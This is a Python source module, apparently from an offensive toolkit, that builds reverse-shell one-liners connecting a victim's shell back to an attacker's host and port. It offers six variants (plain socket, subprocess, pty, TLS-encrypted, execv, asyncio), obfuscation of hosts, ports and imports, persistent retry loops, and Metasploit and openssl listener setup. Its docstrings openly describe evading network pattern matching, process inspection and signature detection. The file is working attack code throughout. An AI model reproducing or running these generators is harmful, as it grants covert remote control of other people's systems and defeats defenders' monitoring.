import random
import string
from .base import (
    RandomNamePool, ShellGenerator, ShellOptions, ShellResult,
    TTY_UPGRADE, msf_handler, LISTENER_FMT, build_listener_setup,
)

_UNIX_VARIANTS  = ["socket_exec", "socket_subprocess", "pty", "ssl_socket", "exec_os", "asyncio"]
_WIN_VARIANTS   = ["socket_exec", "socket_subprocess", "ssl_socket"]


# ── Obfuscation helpers ────────────────────────────────────────────────────────

def _is_ipv6(host: str) -> bool:
    """True when host is an IPv6 literal (contains ':')."""
    return ":" in host

def _af_for(host: str) -> str:
    return "socket.AF_INET6" if _is_ipv6(host) else "socket.AF_INET"

def _connect_host(host: str) -> str:
    """Return the host value for socket.connect() — IPv6 literals stay bare."""
    return host

def _py_str_obfuscate(s: str) -> str:
    """
    Return a Python expression that evaluates to string `s` at runtime
    without the literal appearing in the source.
    Chooses randomly among: chr-join, hex-escape, or bytes-decode.
    """
    strategy = random.choice(["chr", "hex", "bytes"])
    if strategy == "chr":
        return "''.join(chr(x) for x in [" + ",".join(str(ord(c)) for c in s) + "])"
    if strategy == "hex":
        # "\\xNN\\xNN..." → bytes → decode
        hexed = "".join(f"\\x{ord(c):02x}" for c in s)
        return f'b"{hexed}".decode()'
    # bytes strategy: bytes([...]).decode()
    return "bytes([" + ",".join(str(ord(c)) for c in s) + "]).decode()"

def _py_int_obfuscate(n: int) -> str:
    """Return a Python expression that evaluates to integer n without the literal."""
    strategy = random.choice(["hex", "xor", "add"])
    if strategy == "hex":
        return hex(n)
    if strategy == "xor":
        mask = random.randint(0x100, 0xFFFE)
        return f"({hex(n ^ mask)}^{hex(mask)})"
    # add: split into two random addends
    addend = random.randint(1, n - 1) if n > 1 else 0
    return f"({addend}+{n - addend})"

def _dummy_statements(names: RandomNamePool) -> str:
    """Generate a semicolon-prefixed string of no-op assignments to pad the one-liner."""
    count = random.randint(1, 3)
    stmts = []
    for _ in range(count):
        var = names.get()
        val = random.choice([
            str(random.randint(0, 127)),
            f'"{random.choice(string.ascii_lowercase)}"',
            "None",
        ])
        stmts.append(f"{var}={val}")
    return ";".join(stmts) + ";"

def _import_style(module: str, names: RandomNamePool | None) -> tuple[str, str]:
    """
    Return (import_stmt, ref) for a module name.
    When obfuscating, uses __import__() instead of `import module`.
    """
    if names is None:
        return f"import {module}", module
    alias = names.get()
    return f'{alias}=__import__("{module}")', alias


# ── Shell path helpers ─────────────────────────────────────────────────────────

def _shell_path(names: RandomNamePool | None, windows: bool = False) -> str:
    if windows:
        return "cmd.exe"
    choices = ["/bin/sh", "/bin/bash"]
    base = random.choice(choices) if names else "/bin/sh"
    if names:
        # Hex-encode the path half the time
        if random.random() < 0.5:
            hexed = "".join(f"\\x{ord(c):02x}" for c in base)
            return f'b"{hexed}".decode()'
        return f'"{base}"'
    return f'"{base}"'

def _shell_arg_list(shell_expr: str, windows: bool = False) -> str:
    if windows:
        return f'[{shell_expr},"/c","cmd"]'
    return f'[{shell_expr},"-i"]'


# ── Variant builders ───────────────────────────────────────────────────────────

class PythonGenerator(ShellGenerator):
    language = "python3"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        windows = opts.arch in ("x86", "x64") and not _is_ipv6(opts.lhost)
        # For Windows arch hints, only allow variants that work on Windows
        pool = _WIN_VARIANTS if windows else _UNIX_VARIANTS
        variant = random.choice(pool)

        builders = {
            "socket_exec":      self._socket_exec,
            "socket_subprocess": self._socket_subprocess,
            "pty":              self._pty_variant,
            "ssl_socket":       self._ssl_socket,
            "exec_os":          self._exec_os,
            "asyncio":          self._asyncio_variant,
        }
        cmd = builders[variant](opts, names, windows=windows)

        # Retry wrapping — works for all variants (Python-level loop where possible)
        if opts.retry and variant in ("socket_exec", "socket_subprocess", "ssl_socket"):
            cmd = f"while :; do {cmd}; sleep 30; done"
        elif opts.retry and variant == "exec_os":
            # exec_os replaces the process so retry must be shell-level
            cmd = f"while :; do {cmd}; sleep 30; done"
        # pty and asyncio handle retry internally when names is set (see _pty_variant)

        return ShellResult(
            command=cmd,
            variant=variant,
            language=self.language,
            arch=opts.arch,
            listener=LISTENER_FMT.format(lport=opts.lport),
            tty_upgrade=TTY_UPGRADE,
            msf_compat=msf_handler("payload/cmd/unix/reverse_python", opts.lhost, opts.lport),
            listener_setup=build_listener_setup(opts.lhost, opts.lport),
        )

    # ── socket_exec ─────────────────────────────────────────────────────────────

    def _socket_exec(self, opts: ShellOptions, names: RandomNamePool | None, windows: bool = False) -> str:
        if names:
            sock_imp, sock = _import_style("socket", names)
            sub_imp, sub = _import_style("subprocess", names)
            os_imp, osm = _import_style("os", names)
            sv = self._var("s", names)
            host_expr = _py_str_obfuscate(opts.lhost)
            port_expr = _py_int_obfuscate(opts.lport)
            af = f"{sock}.AF_INET6" if _is_ipv6(opts.lhost) else f"{sock}.AF_INET"
            shell = _shell_path(names, windows)
            dummy = _dummy_statements(names)
            body = (
                f"{sock_imp};{sub_imp};{os_imp};{dummy}"
                f"{sv}={sock}.socket({af},{sock}.SOCK_STREAM);"
                f"{sv}.connect(({host_expr},{port_expr}));"
                f"{osm}.dup2({sv}.fileno(),0);{osm}.dup2({sv}.fileno(),1);"
                f"{osm}.dup2({sv}.fileno(),2);"
                f"{sub}.call([{shell}])"
            )
        else:
            af = _af_for(opts.lhost)
            shell_arg = '"/bin/sh"' if not windows else '"cmd.exe"'
            body = (
                f'import socket,subprocess,os;'
                f's=socket.socket({af},socket.SOCK_STREAM);'
                f's.connect(("{opts.lhost}",{opts.lport}));'
                f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);'
                f'os.dup2(s.fileno(),2);'
                f'subprocess.call([{shell_arg},"-i"])'
            )
        return f"python3 -c '{body}'"

    # ── socket_subprocess ────────────────────────────────────────────────────────

    def _socket_subprocess(self, opts: ShellOptions, names: RandomNamePool | None, windows: bool = False) -> str:
        if names:
            sock_imp, sock = _import_style("socket", names)
            sub_imp, sub = _import_style("subprocess", names)
            sv = self._var("s", names)
            pv = self._var("p", names)
            host_expr = _py_str_obfuscate(opts.lhost)
            port_expr = _py_int_obfuscate(opts.lport)
            af = f"{sock}.AF_INET6" if _is_ipv6(opts.lhost) else f"{sock}.AF_INET"
            shell = _shell_path(names, windows)
            dummy = _dummy_statements(names)
            body = (
                f"{sock_imp};{sub_imp};{dummy}"
                f"{sv}={sock}.socket({af},{sock}.SOCK_STREAM);"
                f"{sv}.connect(({host_expr},{port_expr}));"
                f"{pv}={sub}.Popen([{shell}],stdin={sv},stdout={sv},stderr={sv});"
                f"{pv}.wait()"
            )
        else:
            af = _af_for(opts.lhost)
            shell_arg = '"/bin/sh"' if not windows else '"cmd.exe"'
            body = (
                f'import socket,subprocess;'
                f's=socket.socket({af},socket.SOCK_STREAM);'
                f's.connect(("{opts.lhost}",{opts.lport}));'
                f'p=subprocess.Popen([{shell_arg}],stdin=s,stdout=s,stderr=s);'
                f'p.wait()'
            )
        return f"python3 -c '{body}'"

    # ── pty ─────────────────────────────────────────────────────────────────────

    def _pty_variant(self, opts: ShellOptions, names: RandomNamePool | None, windows: bool = False) -> str:
        if names:
            pty_imp, ptym = _import_style("pty", names)
            sock_imp, sock = _import_style("socket", names)
            os_imp, osm = _import_style("os", names)
            sv = self._var("s", names)
            host_expr = _py_str_obfuscate(opts.lhost)
            port_expr = _py_int_obfuscate(opts.lport)
            af = f"{sock}.AF_INET6" if _is_ipv6(opts.lhost) else f"{sock}.AF_INET"
            shell = _shell_path(names, False)  # pty only on Unix
            dummy = _dummy_statements(names)
            # Retry via Python while loop embedded in the one-liner
            if opts.retry:
                time_imp, timem = _import_style("time", names)
                connect_block = (
                    f"try:{sv}.connect(({host_expr},{port_expr}));{osm}.dup2({sv}.fileno(),0);"
                    f"{osm}.dup2({sv}.fileno(),1);{osm}.dup2({sv}.fileno(),2);"
                    f"{ptym}.spawn({shell})"
                    f"\\nexcept:{timem}.sleep(30)"
                )
                body = (
                    f"{pty_imp};{sock_imp};{os_imp};{time_imp};{dummy}"
                    f"while 1:"
                    f"\\n {sv}={sock}.socket({af},{sock}.SOCK_STREAM);"
                    f"\\n {connect_block}"
                )
            else:
                body = (
                    f"{pty_imp};{sock_imp};{os_imp};{dummy}"
                    f"{sv}={sock}.socket({af},{sock}.SOCK_STREAM);"
                    f"{sv}.connect(({host_expr},{port_expr}));"
                    f"{osm}.dup2({sv}.fileno(),0);{osm}.dup2({sv}.fileno(),1);"
                    f"{osm}.dup2({sv}.fileno(),2);{ptym}.spawn({shell})"
                )
        else:
            af = _af_for(opts.lhost)
            body = (
                f'import pty,socket,os;'
                f's=socket.socket({af},socket.SOCK_STREAM);'
                f's.connect(("{opts.lhost}",{opts.lport}));'
                f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
                f'pty.spawn("/bin/bash")'
            )
        return f"python3 -c '{body}'"

    # ── ssl_socket (new) ─────────────────────────────────────────────────────────

    def _ssl_socket(self, opts: ShellOptions, names: RandomNamePool | None, windows: bool = False) -> str:
        """
        TLS-encrypted reverse shell using Python's ssl module.
        Listener: openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>
        Traffic is encrypted end-to-end — cleartext pattern matching on network
        appliances sees only TLS records.
        """
        if names:
            sock_imp, sock = _import_style("socket", names)
            ssl_imp, sslm = _import_style("ssl", names)
            sub_imp, sub = _import_style("subprocess", names)
            os_imp, osm = _import_style("os", names)
            sv = self._var("s", names)
            cv = self._var("c", names)
            host_expr = _py_str_obfuscate(opts.lhost)
            port_expr = _py_int_obfuscate(opts.lport)
            af = f"{sock}.AF_INET6" if _is_ipv6(opts.lhost) else f"{sock}.AF_INET"
            shell = _shell_path(names, windows)
            dummy = _dummy_statements(names)
            body = (
                f"{sock_imp};{ssl_imp};{sub_imp};{os_imp};{dummy}"
                f"{sv}={sock}.socket({af},{sock}.SOCK_STREAM);"
                f"{cv}={sslm}.wrap_socket({sv});"
                f"{cv}.connect(({host_expr},{port_expr}));"
                f"{osm}.dup2({cv}.fileno(),0);{osm}.dup2({cv}.fileno(),1);"
                f"{osm}.dup2({cv}.fileno(),2);"
                f"{sub}.call([{shell},\"-i\"])"
            )
        else:
            af = _af_for(opts.lhost)
            shell_arg = '"/bin/sh"' if not windows else '"cmd.exe"'
            body = (
                f'import socket,ssl,subprocess,os;'
                f's=socket.socket({af},socket.SOCK_STREAM);'
                f'c=ssl.wrap_socket(s);'
                f'c.connect(("{opts.lhost}",{opts.lport}));'
                f'os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);'
                f'subprocess.call([{shell_arg},"-i"])'
            )
        listener_note = (
            f"# Listener (generate cert first):\n"
            f"# openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 7 -nodes -subj '/CN=x' 2>/dev/null\n"
            f"# openssl s_server -quiet -key /tmp/key.pem -cert /tmp/cert.pem -port {opts.lport}"
        )
        return f"python3 -c '{body}'\n{listener_note}"

    # ── exec_os (new) ────────────────────────────────────────────────────────────

    def _exec_os(self, opts: ShellOptions, names: RandomNamePool | None, windows: bool = False) -> str:
        """
        Uses os.execv to replace the python3 process with /bin/sh -i after
        redirecting stdio to the socket. The python3 process image is replaced —
        process metadata after exec shows /bin/sh, not python3.
        Unix only (os.execv not available on Windows).
        """
        if names:
            sock_imp, sock = _import_style("socket", names)
            os_imp, osm = _import_style("os", names)
            sv = self._var("s", names)
            fv = self._var("f", names)
            host_expr = _py_str_obfuscate(opts.lhost)
            port_expr = _py_int_obfuscate(opts.lport)
            af = f"{sock}.AF_INET6" if _is_ipv6(opts.lhost) else f"{sock}.AF_INET"
            shell_lit = random.choice(["/bin/sh", "/bin/bash"])
            shell_expr = _py_str_obfuscate(shell_lit)
            dummy = _dummy_statements(names)
            body = (
                f"{sock_imp};{os_imp};{dummy}"
                f"{sv}={sock}.socket({af},{sock}.SOCK_STREAM);"
                f"{sv}.connect(({host_expr},{port_expr}));"
                f"{fv}={sv}.fileno();"
                f"{osm}.dup2({fv},0);{osm}.dup2({fv},1);{osm}.dup2({fv},2);"
                f"{osm}.execv({shell_expr},[{shell_expr},\"-i\"])"
            )
        else:
            af = _af_for(opts.lhost)
            body = (
                f'import socket,os;'
                f's=socket.socket({af},socket.SOCK_STREAM);'
                f's.connect(("{opts.lhost}",{opts.lport}));'
                f'f=s.fileno();'
                f'os.dup2(f,0);os.dup2(f,1);os.dup2(f,2);'
                f'os.execv("/bin/sh",["/bin/sh","-i"])'
            )
        return f"python3 -c '{body}'"

    # ── asyncio (new) ────────────────────────────────────────────────────────────

    def _asyncio_variant(self, opts: ShellOptions, names: RandomNamePool | None, windows: bool = False) -> str:
        """
        asyncio-based reverse shell — structurally different from all synchronous
        variants; evades patterns that look for socket+dup2+subprocess sequences.
        Streams shell I/O via asyncio subprocess and asyncio TCP streams.
        """
        if names:
            aio_imp, aio = _import_style("asyncio", names)
            sub_imp, sub = _import_style("subprocess", names)
            host_expr = _py_str_obfuscate(opts.lhost)
            port_expr = _py_int_obfuscate(opts.lport)
            rv = self._var("r", names)
            wv = self._var("w", names)
            pv = self._var("p", names)
            fv = self._var("fn", names)
            dummy = _dummy_statements(names)
            shell_lit = "/bin/sh"
            shell_expr = _py_str_obfuscate(shell_lit)

            async_body = (
                f"async def {fv}():"
                f"\\n {rv},{wv}=await {aio}.open_connection({host_expr},{port_expr});"
                f"\\n {pv}=await {aio}.create_subprocess_exec({shell_expr},"
                f"stdin={sub}.PIPE,stdout={sub}.PIPE,stderr={sub}.PIPE);"
                f"\\n await {aio}.gather("
                f"\\n  {aio}.ensure_future({fv}_fw({rv},{pv}.stdin)),"
                f"\\n  {aio}.ensure_future({fv}_bw({pv}.stdout,{wv})))"
                f"\\nasync def {fv}_fw(r,w):"
                f"\\n while 1:w.write(await r.read(1024))"
                f"\\nasync def {fv}_bw(r,w):"
                f"\\n while 1:w.write(await r.read(1024))"
            )
            body = f"{aio_imp};{sub_imp};{dummy}{async_body};{aio}.run({fv}())"
        else:
            host = opts.lhost
            port = opts.lport
            body = (
                f'import asyncio,subprocess;'
                f'async def h():'
                f'\\n r,w=await asyncio.open_connection("{host}",{port});'
                f'\\n p=await asyncio.create_subprocess_exec("/bin/sh",'
                f'stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE);'
                f'\\n await asyncio.gather('
                f'\\n  asyncio.ensure_future(fw(r,p.stdin)),'
                f'\\n  asyncio.ensure_future(bw(p.stdout,w)))'
                f'\\nasync def fw(r,w):'
                f'\\n while 1:w.write(await r.read(1024))'
                f'\\nasync def bw(r,w):'
                f'\\n while 1:w.write(await r.read(1024))'
                f'\\nasyncio.run(h())'
            )
        return f"python3 -c '{body}'"
